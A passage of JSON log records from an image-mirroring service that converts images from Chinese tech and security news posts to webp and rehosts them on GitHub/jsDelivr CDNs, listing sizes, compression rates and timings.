15:31:20","host":"us-017*","referer":"https://www.4hou.com/posts/N5lD","linkMd5ListStr":"072eb2032d7770811393baa5bd62da28","githubUser":"myreaderx19","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"65.8 KB","destSize":"32.4 KB","compressRate":"49.3%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200824/1598239925586990.jpeg","sourceStatusCode":200,"destWidth":1076,"destHeight":341,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx13/cdn52@2020_4/2020/09/05/07-31-20-941_72d7327ff0c95d9f.webp","sourceBytes":20161,"destBytes":18164,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":4684,"convertSpendMs":23,"createdTime":"2020-09-05 15:31:17","host":"us-023*","referer":"https://www.4hou.com/posts/p7j6","linkMd5ListStr":"8d0ba5a94eb804af394fd80b5861516c","githubUser":"myreaderx13","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"19.7 KB","destSize":"17.7 KB","compressRate":"90.1%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200824/1598239929829443.png","sourceStatusCode":200,"destWidth":625,"destHeight":379,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx19/cdn16@2020_3/2020/09/05/07-31-21-015_d181fff29cc0135f.webp","sourceBytes":18760,"destBytes":19648,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":4921,"convertSpendMs":10,"createdTime":"2020-09-05 15:31:16","host":"us-002*","referer":"https://www.4hou.com/posts/p7j6","linkMd5ListStr":"8d0ba5a94eb804af394fd80b5861516c","githubUser":"myreaderx19","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"18.3 KB","destSize":"19.2 KB","compressRate":"104.7%"},{"code":1,"isDone":false,"source":"https://pic.36krcnd.com/202009/02013349/v6w22ba0eplyepgt","sourceStatusCode":200,"destWidth":936,"destHeight":240,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx16/cdn68@2020_1/2020/09/05/07-31-20-972_b3fb9780b8d8e06b.webp","sourceBytes":101633,"destBytes":29466,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":2667,"convertSpendMs":52,"createdTime":"2020-09-05 15:31:19","host":"us-012*","referer":"https://www.4hou.com/posts/QvrY","linkMd5ListStr":"6065d354c99cc3ce6980c438cf2d40b5","githubUser":"myreaderx16","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"99.3 KB","destSize":"28.8 KB","compressRate":"29%"},{"code":1,"isDone":false,"source":"https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1579194723160-YYKRSY33QB7MHL9FIXZC/ke17ZwdGBToddI8pDm48kJgRbFuPhVm4f5DQi9afq9FZw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZamWLI2zvYWH8K3-s_4yszcp2ryTI0HqTOaaUohrI8PILhzv7z9gPCLegz8VfcZ7eZpubCFfMdM-WuaxGXmrTY0/Picture12.png?format=1000w","sourceStatusCode":200,"destWidth":974,"destHeight":304,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx30/cdn4@2020_1/2020/09/05/07-31-21-079_d3ca0bd53f5eae3c.webp","sourceBytes":134491,"destBytes":70470,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":984,"convertSpendMs":21,"createdTime":"2020-09-05 15:31:21","host":"us-033*","referer":"https://www.4hou.com/posts/N5lD","linkMd5ListStr":"072eb2032d7770811393baa5bd62da28","githubUser":"myreaderx30","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"131.3 KB","destSize":"68.8 KB","compressRate":"52.4%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200903/1599102002145263.png","sourceStatusCode":200,"destWidth":739,"destHeight":679,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx/cdn76@2020_1/2020/09/05/07-31-20-811_ab13673247ac959f.webp","sourceBytes":28326,"destBytes":79462,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":2715,"convertSpendMs":23,"createdTime":"2020-09-05 15:31:19","host":"europe63*","referer":"https://www.4hou.com/posts/ZpK6","linkMd5ListStr":"767cdf6c195e7f1c0458b91104e0ccf8","githubUser":"myreaderx","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"27.7 KB","destSize":"77.6 KB","compressRate":"280.5%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200903/1599101997142388.png","sourceStatusCode":200,"destWidth":953,"destHeight":208,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx11/cdn26@2020_2/2020/09/05/07-31-21-396_923aba3701137f43.webp","sourceBytes":29334,"destBytes":26870,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":7224,"convertSpendMs":11,"createdTime":"2020-09-05 15:31:15","host":"us-009*","referer":"https://www.4hou.com/posts/ZpK6","linkMd5ListStr":"767cdf6c195e7f1c0458b91104e0ccf8","githubUser":"myreaderx11","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"28.6 KB","destSize":"26.2 KB","compressRate":"91.6%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200824/1598239929567599.png","sourceStatusCode":200,"destWidth":725,"destHeight":480,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx15/cdn7@2020_1/2020/09/05/07-31-21-480_53f11e311364750d.webp","sourceBytes":14490,"destBytes":18602,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":5430,"convertSpendMs":18,"createdTime":"2020-09-05 15:31:16","host":"us-027*","referer":"https://www.4hou.com/posts/p7j6","linkMd5ListStr":"8d0ba5a94eb804af394fd80b5861516c","githubUser":"myreaderx15","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"14.2 KB","destSize":"18.2 KB","compressRate":"128.4%"},{"code":1,"isDone":false,"source":"https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1579191576348-7XLM4TIQX5XW2NFS3EBX/ke17ZwdGBToddI8pDm48kBchc7xnrS7Gdo12TWJ-8n5Zw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZamWLI2zvYWH8K3-s_4yszcp2ryTI0HqTOaaUohrI8PIW2WQp2P3Lck4hhr40BERrd2UNrVWY2NhjRIcV6fFPyk/Picture4.png?format=1000w","sourceStatusCode":200,"destWidth":974,"destHeight":277,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx18/cdn95@2020_2/2020/09/05/07-31-21-107_64d446828dd981e3.webp","sourceBytes":111234,"destBytes":68444,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":1466,"convertSpendMs":21,"createdTime":"2020-09-05 15:31:20","host":"europe67*","referer":"https://www.4hou.com/posts/N5lD","linkMd5ListStr":"072eb2032d7770811393baa5bd62da28","githubUser":"myreaderx18","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"108.6 KB","destSize":"66.8 KB","compressRate":"61.5%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200822/1598074501280860.png","sourceStatusCode":200,"destWidth":708,"destHeight":372,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx33/cdn68@2020_2/2020/09/05/07-31-21-505_5028c1cfa713d437.webp","sourceBytes":16929,"destBytes":22542,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":5255,"convertSpendMs":21,"createdTime":"2020-09-05 15:31:17","host":"us-039*","referer":"https://www.4hou.com/posts/mG90","linkMd5ListStr":"7c030266888b48c212298d4439949659","githubUser":"myreaderx33","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"16.5 KB","destSize":"22 KB","compressRate":"133.2%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200824/1598239934140835.png","sourceStatusCode":200,"destWidth":760,"destHeight":390,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx5oss/cdn59@2020_1/2020/09/05/07-31-21-593_6a08821105ede966.webp","sourceBytes":121568,"destBytes":28858,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":3337,"convertSpendMs":18,"createdTime":"2020-09-05 15:31:19","host":"us-037*","referer":"https://www.4hou.com/posts/p7j6","linkMd5ListStr":"8d0ba5a94eb804af394fd80b5861516c","githubUser":"myreaderx5oss","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"118.7 KB","destSize":"28.2 KB","compressRate":"23.7%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200904/1599192117869203.png","sourceStatusCode":200,"destWidth":1280,"destHeight":775,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx8/cdn80@2020_5/2020/09/05/07-31-21-635_99e16a501ba97c97.webp","sourceBytes":127127,"destBytes":55028,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":4561,"convertSpendMs":29,"createdTime":"2020-09-05 15:31:17","host":"us-002*","referer":"https://www.4hou.com/posts/lDyl","linkMd5ListStr":"04a80f6b7974cfbb572ac23346ea5ec8","githubUser":"myreaderx8","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"124.1 KB","destSize":"53.7 KB","compressRate":"43.3%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200903/1599102001149980.png","sourceStatusCode":200,"destWidth":1209,"destHeight":865,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx12/cdn75@2020_4/2020/09/05/07-31-21-347_2ed0f0626c4f6e27.webp","sourceBytes":120445,"destBytes":111654,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":6069,"convertSpendMs":36,"createdTime":"2020-09-05 15:31:16","host":"europe69*","referer":"https://www.4hou.com/posts/ZpK6","linkMd5ListStr":"767cdf6c195e7f1c0458b91104e0ccf8","githubUser":"myreaderx12","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"117.6 KB","destSize":"109 KB","compressRate":"92.7%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200902/1599038929138133.png","sourceStatusCode":200,"destWidth":692,"destHeight":365,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx27/cdn56@2020_2/2020/09/05/07-31-21-901_a71f323aa258c641.webp","sourceBytes":20052,"destBytes":29388,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":5612,"convertSpendMs":12,"createdTime":"2020-09-05 15:31:17","host":"us-010*","referer":"https://www.4hou.com/posts/53vR","linkMd5ListStr":"2184c32448c38dcf20754011036d1b8a","githubUser":"myreaderx27","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"19.6 KB","destSize":"28.7 KB","compressRate":"146.6%"},{"code":1,"isDone":false,"source":"https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1579192189163-9JWSASQ0QQQDYM119GYJ/ke17ZwdGBToddI8pDm48kAFsUSSKKlmnQ5Qxr8CgXjpZw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZamWLI2zvYWH8K3-s_4yszcp2ryTI0HqTOaaUohrI8PIyE_WFN3XtFiXRVyJEd069uiFIUaIhYvCZrFPgsB2GVU/Picture9.png?format=1000w","sourceStatusCode":200,"destWidth":974,"destHeight":462,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx7/cdn27@2020_3/2020/09/05/07-31-22-070_e24b527d502104d3.webp","sourceBytes":174389,"destBytes":60870,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":1127,"convertSpendMs":124,"createdTime":"2020-09-05 15:31:21","host":"us-025*","referer":"https://www.4hou.com/posts/N5lD","linkMd5ListStr":"072eb2032d7770811393baa5bd62da28","githubUser":"myreaderx7","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"170.3 KB","destSize":"59.4 KB","compressRate":"34.9%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200904/1599192114131061.jpeg","sourceStatusCode":200,"destWidth":632,"destHeight":509,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx15/cdn79@2020_3/2020/09/05/07-31-22-144_4369dd78943d2787.webp","sourceBytes":29987,"destBytes":25118,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":3299,"convertSpendMs":12,"createdTime":"2020-09-05 15:31:19","host":"us-51*","referer":"https://www.4hou.com/posts/lDyl","linkMd5ListStr":"04a80f6b7974cfbb572ac23346ea5ec8","githubUser":"myreaderx15","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"29.3 KB","destSize":"24.5 KB","compressRate":"83.8%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200903/1599101994869773.png","sourceStatusCode":200,"destWidth":987,"destHeight":226,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx2/cdn71@2020_4/2020/09/05/07-31-22-137_b7eda409fb638a31.webp","sourceBytes":10837,"destBytes":31956,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":5848,"convertSpendMs":17,"createdTime":"2020-09-05 15:31:17","host":"us-027*","referer":"https://www.4hou.com/posts/ZpK6","linkMd5ListStr":"767cdf6c195e7f1c0458b91104e0ccf8","githubUser":"myreaderx2","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"10.6 KB","destSize":"31.2 KB","compressRate":"294.9%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200824/1598239924825697.jpeg","sourceStatusCode":200,"destWidth":1323,"destHeight":509,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx32/cdn64@2020_3/2020/09/05/07-31-22-026_130e7b429bc08710.webp","sourceBytes":31612,"destBytes":22012,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":5790,"convertSpendMs":21,"createdTime":"2020-09-05 15:31:17","host":"europe61*","referer":"https://www.4hou.com/posts/p7j6","linkMd5ListStr":"8d0ba5a94eb804af394fd80b5861516c","githubUser":"myreaderx32","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"30.9 KB","destSize":"21.5 KB","compressRate":"69.6%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200903/1599101995143789.png","sourceStatusCode":200,"destWidth":987,"destHeight":63,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx11/cdn8@2020_6/2020/09/05/07-31-22-507_e4d925c1f9edaa79.webp","sourceBytes":3955,"destBytes":6208,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":2124,"convertSpendMs":6,"createdTime":"2020-09-05 15:31:21","host":"us-021*","referer":"https://www.4hou.com/posts/ZpK6","linkMd5ListStr":"767cdf6c195e7f1c0458b91104e0ccf8","githubUser":"myreaderx11","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"3.9 KB","destSize":"6.1 KB","compressRate":"157%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200903/1599102001106861.png","sourceStatusCode":200,"destWidth":718,"destHeight":844,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx/cdn4@2020_5/2020/09/05/07-31-22-294_0c1794ba27c58380.webp","sourceBytes":24709,"destBytes":67520,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":6498,"convertSpendMs":111,"createdTime":"2020-09-05 15:31:16","host":"us-039*","referer":"https://www.4hou.com/posts/ZpK6","linkMd5ListStr":"767cdf6c195e7f1c0458b91104e0ccf8","githubUser":"myreaderx","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"24.1 KB","destSize":"65.9 KB","compressRate":"273.3%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200824/1598239249520433.jpeg","sourceStatusCode":200,"destWidth":1015,"destHeight":118,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx3/cdn84@2020_1/2020/09/05/07-31-22-496_da1f7cbe4d2a5f28.webp","sourceBytes":25176,"destBytes":22752,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":6771,"convertSpendMs":9,"createdTime":"2020-09-05 15:31:16","host":"us-035*","referer":"https://www.4hou.com/posts/o7gK","linkMd5ListStr":"ddc5f53c84d25939a386e5b2bb709c67","githubUser":"myreaderx3","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"24.6 KB","destSize":"22.2 KB","compressRate":"90.4%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200904/1599192118179786.png","sourceStatusCode":200,"destWidth":923,"destHeight":448,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx10/cdn75@2020_1/2020/09/05/07-31-22-595_63932e56b3c299d3.webp","sourceBytes":37887,"destBytes":21726,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":6051,"convertSpendMs":15,"createdTime":"2020-09-05 15:31:17","host":"us-014*","referer":"https://www.4hou.com/posts/lDyl","linkMd5ListStr":"04a80f6b7974cfbb572ac23346ea5ec8","githubUser":"myreaderx10","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"37 KB","destSize":"21.2 KB","compressRate":"57.3%"},{"code":1,"isDone":false,"source":"https://pic.36krcnd.com/202009/02013349/sku0pcj6irct3l2o","sourceStatusCode":200,"destWidth":1080,"destHeight":520,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx1/cdn11@2020_1/2020/09/05/07-31-22-682_421b83b4ec969a06.webp","sourceBytes":122198,"destBytes":17476,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":2364,"convertSpendMs":26,"createdTime":"2020-09-05 15:31:21","host":"us-008*","referer":"https://www.4hou.com/posts/QvrY","linkMd5ListStr":"6065d354c99cc3ce6980c438cf2d40b5","githubUser":"myreaderx1","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"119.3 KB","destSize":"17.1 KB","compressRate":"14.3%"},{"code":1,"isDone":false,"source":"https://i1.wp.com/marcoramilli.com/wp-content/uploads/2020/07/1-12.png?resize=1024%2C829&ssl=1","sourceStatusCode":200,"destWidth":1024,"destHeight":829,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx3/cdn64@2020_2/2020/09/05/07-31-22-612_f997b630871bf425.webp","sourceBytes":125024,"destBytes":125024,"feedId":6942,"totalSpendMs":1069,"convertSpendMs":0,"createdTime":"2020-09-05 15:31:22","host":"us-55*","referer":"https://www.4hou.com/posts/ZpK6","linkMd5ListStr":"767cdf6c195e7f1c0458b91104e0ccf8","githubUser":"myreaderx3","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"122.1 KB","destSize":"122.1 KB","compressRate":"100%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200824/1598239930167819.png","sourceStatusCode":200,"destWidth":1269,"destHeight":573,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx8/cdn68@2020_4/2020/09/05/07-31-22-911_605ad1048d0dc9b8.webp","sourceBytes":90148,"destBytes":26148,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":7342,"convertSpendMs":39,"createdTime":"2020-09-05 15:31:16","host":"us-019*","referer":"https://www.4hou.com/posts/p7j6","linkMd5ListStr":"8d0ba5a94eb804af394fd80b5861516c","githubUser":"myreaderx8","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"88 KB","destSize":"25.5 KB","compressRate":"29%"},{"code":1,"isDone":false,"source":"https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1579192477279-A287HJKNYHFG5GBO8K8K/ke17ZwdGBToddI8pDm48kMYS97YDZ964kPC-PsrdCZNZw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZamWLI2zvYWH8K3-s_4yszcp2ryTI0HqTOaaUohrI8PIWCjOwOEgHJeyy_Ns8_U9jS-2IugWvb4TGJWH1DYbj1E/Picture10.png?format=1000w","sourceStatusCode":200,"destWidth":974,"destHeight":412,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx24/cdn59@2020_3/2020/09/05/07-31-22-717_d45d71e70a2b9fcf.webp","sourceBytes":69335,"destBytes":30528,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":1210,"convertSpendMs":17,"createdTime":"2020-09-05 15:31:22","host":"europe67*","referer":"https://www.4hou.com/posts/N5lD","linkMd5ListStr":"072eb2032d7770811393baa5bd62da28","githubUser":"myreaderx24","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"67.7 KB","destSize":"29.8 KB","compressRate":"44%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200824/1598239936389667.png","sourceStatusCode":200,"destWidth":526,"destHeight":192,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx21/cdn16@2020_2/2020/09/05/07-31-23-029_751b4fee7fe0347e.webp","sourceBytes":3659,"destBytes":8042,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":2476,"convertSpendMs":7,"createdTime":"2020-09-05 15:31:21","host":"europe21*","referer":"https://www.4hou.com/posts/p7j6","linkMd5ListStr":"8d0ba5a94eb804af394fd80b5861516c","githubUser":"myreaderx21","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"3.6 KB","destSize":"7.9 KB","compressRate":"219.8%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200824/1598239248441806.jpeg","sourceStatusCode":200,"destWidth":1283,"destHeight":485,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx25/cdn71@2020_5/2020/09/05/07-31-23-127_1ce8499ad03441d2.webp","sourceBytes":96893,"destBytes":82046,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":7544,"convertSpendMs":44,"createdTime":"2020-09-05 15:31:16","host":"us-006*","referer":"https://www.4hou.com/posts/o7gK","linkMd5ListStr":"ddc5f53c84d25939a386e5b2bb709c67","githubUser":"myreaderx25","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"94.6 KB","destSize":"80.1 KB","compressRate":"84.7%"},{"code":1,"isDone":false,"source":"https://pic.36krcnd.com/202009/02013349/y2qinvwe489edayb","sourceStatusCode":200,"destWidth":936,"destHeight":270,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx2/cdn39@2020_4/2020/09/05/07-31-23-363_0612cdf0c50d7228.webp","sourceBytes":26833,"destBytes":8874,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":2150,"convertSpendMs":11,"createdTime":"2020-09-05 15:31:22","host":"europe63*","referer":"https://www.4hou.com/posts/QvrY","linkMd5ListStr":"6065d354c99cc3ce6980c438cf2d40b5","githubUser":"myreaderx2","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"26.2 KB","destSize":"8.7 KB","compressRate":"33.1%"},{"code":1,"isDone":false,"source":"https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1579194512253-5XJ6L16JDIGYQ39594VM/ke17ZwdGBToddI8pDm48kAs_J0lBf1JvVIafT9CqwFdZw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZamWLI2zvYWH8K3-s_4yszcp2ryTI0HqTOaaUohrI8PIol2DSb4AzQb3sP3fXrGVtYOwyVAhpc7_no7sX2z9fu8/Picture11.png?format=1000w","sourceStatusCode":200,"destWidth":974,"destHeight":470,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx16/cdn82@2020_4/2020/09/05/07-31-23-277_5cd80cba3cf67f92.webp","sourceBytes":91472,"destBytes":38622,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":1262,"convertSpendMs":21,"createdTime":"2020-09-05 15:31:23","host":"europe-22*","referer":"https://www.4hou.com/posts/N5lD","linkMd5ListStr":"072eb2032d7770811393baa5bd62da28","githubUser":"myreaderx16","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"89.3 KB","destSize":"37.7 KB","compressRate":"42.2%"},{"code":1,"isDone":false,"source":"https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1579191632127-6REPIAPMZMAIICFNE5UA/ke17ZwdGBToddI8pDm48kKLqMlWCPdudun8p5KLDdxFZw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZamWLI2zvYWH8K3-s_4yszcp2ryTI0HqTOaaUohrI8PITxeqJV2V5NS-wC90vBwsn3Ahzg9nJWNA3hHAZpxiFBY/Picture5.png?format=1000w","sourceStatusCode":200,"destWidth":974,"destHeight":395,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx30/cdn22@2020_6/2020/09/05/07-31-23-765_34eeb26cc2716dfc.webp","sourceBytes":31904,"destBytes":79258,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":1102,"convertSpendMs":30,"createdTime":"2020-09-05 15:31:23","host":"us-020*","referer":"https://www.4hou.com/posts/N5lD","linkMd5ListStr":"072eb2032d7770811393baa5bd62da28","githubUser":"myreaderx30","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"31.2 KB","destSize":"77.4 KB","compressRate":"248.4%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200824/1598239930154928.png","sourceStatusCode":200,"destWidth":1063,"destHeight":201,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx32/cdn32@2020_4/2020/09/05/07-31-24-080_42700e88d1926b4c.webp","sourceBytes":58642,"destBytes":16406,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":3070,"convertSpendMs":36,"createdTime":"2020-09-05 15:31:21","host":"us-012*","referer":"https://www.4hou.com/posts/p7j6","linkMd5ListStr":"8d0ba5a94eb804af394fd80b5861516c","githubUser":"myreaderx32","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"57.3 KB","destSize":"16 KB","compressRate":"28%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200822/1598074499167890.png","sourceStatusCode":200,"destWidth":691,"destHeight":229,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx/cdn90@2020_5/2020/09/05/07-31-24-186_3605270a8e0359c2.webp","sourceBytes":4910,"destBytes":8790,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":1862,"convertSpendMs":9,"createdTime":"2020-09-05 15:31:23","host":"us-038*","referer":"https://www.4hou.com/posts/mG90","linkMd5ListStr":"7c030266888b48c212298d4439949659","githubUser":"myreaderx","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"4.8 KB","destSize":"8.6 KB","compressRate":"179%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200904/1599207454762532.png","sourceStatusCode":200,"destWidth":744,"destHeight":496,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx21/cdn48@2020_2/2020/09/05/07-31-24-043_0eac6fcdf6322061.webp","sourceBytes":478503,"destBytes":43918,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":7909,"convertSpendMs":37,"createdTime":"2020-09-05 15:31:17","host":"us-035*","referer":"https://www.4hou.com/posts/o7Bz","linkMd5ListStr":"4f78d6861e72f68e32f7db818d64cf27","githubUser":"myreaderx21","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"467.3 KB","destSize":"42.9 KB","compressRate":"9.2%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200822/1598074499363556.png","sourceStatusCode":200,"destWidth":705,"destHeight":260,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx2/cdn59@2020_3/2020/09/05/07-31-24-124_925a7ef214a418a2.webp","sourceBytes":10999,"destBytes":21452,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":8784,"convertSpendMs":35,"createdTime":"2020-09-05 